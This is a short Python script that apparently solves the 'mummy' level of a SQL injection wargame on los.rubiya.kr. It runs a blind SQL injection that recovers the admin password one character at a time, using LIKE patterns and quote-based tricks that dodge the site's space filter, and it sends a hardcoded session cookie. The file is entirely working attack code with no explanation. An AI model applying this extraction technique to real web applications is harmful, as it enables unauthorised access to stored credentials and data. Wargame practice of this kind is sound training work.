import requests
import string
import time


pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php?query=%a01%a0from%a0prob_mummy%a0where%a0id=%27admin%27and%a0pw%a0like%a0%270%%27--%a0-"
cookies = {'PHPSESSID':'tq37qs365cufgcpm3p42i13pg6'}
for i in range(1,9):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php?query=\"pw\"from\"prob_mummy\"where\"id\"='admin'and\"pw\"like'"+str(pw_)+"%'--"
        res = requests.get(url,cookies=cookies)
        res = res.text
        print(pw_)
        if "Hello anonymous" in res:
            pw+=j
            print("find")
            break
        else: 
            pass